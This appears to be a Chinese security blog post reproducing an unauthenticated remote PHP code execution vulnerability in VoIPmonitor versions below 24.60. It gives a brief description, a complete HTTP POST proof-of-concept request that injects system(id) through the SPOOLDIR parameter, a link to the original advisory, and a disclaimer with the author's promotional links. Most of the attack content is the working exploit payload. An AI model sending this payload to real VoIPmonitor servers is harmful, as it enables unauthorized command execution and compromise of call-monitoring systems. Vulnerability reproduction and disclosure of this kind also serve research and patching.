![1620655874_60993f021db5a8e81ef97.png!small](https://image.3001.net/images/20210510/1620655874_60993f021db5a8e81ef97.png!small)

## 一、漏洞描述

VoIPmonitor Web界面用，允许未经身份验证的远程用户触发VoIPmonitor中的远程PHP代码执行漏洞。

## 二、影响版本

VoIPmonitor < 24.60

## 三、漏洞复现

访问地址页面：

![1620655874_60993f02f31d907d8b9df.png!small](https://image.3001.net/images/20210510/1620655874_60993f02f31d907d8b9df.png!small)

POC：

    
    
    POST /index.php HTTP/1.1
    Host: 
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: close
    Accept-Language: en-US,en;q=0.5
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Content-Length: 49
    SPOOLDIR=test%22.system%28id%29.%22&recheck=annen

![1620655875_60993f0383afe3951fb81.png!small](https://image.3001.net/images/20210510/1620655875_60993f0383afe3951fb81.png!small)

编写尝试脚本：

![1620655876_60993f0428dc1662c3c17.png!small](https://image.3001.net/images/20210510/1620655876_60993f0428dc1662c3c17.png!small)

参考： [https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/
](https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/)

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负! 如果本文内容侵权或者对贵公司业务或者其他有影响，请联系作者删除。
转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 订阅查看更多复现文章、学习笔记 thelostworld
安全路上，与你并肩前行！！！！

![1620655877_60993f05c24aa71bb1ba2.jpg!small](https://image.3001.net/images/20210510/1620655877_60993f05c24aa71bb1ba2.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![1620655878_60993f062a86183a79a15.png!small](https://image.3001.net/images/20210510/1620655878_60993f062a86183a79a15.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![1620655878_60993f06bc76eed27ed1b.png!small](https://image.3001.net/images/20210510/1620655878_60993f06bc76eed27ed1b.png!small)

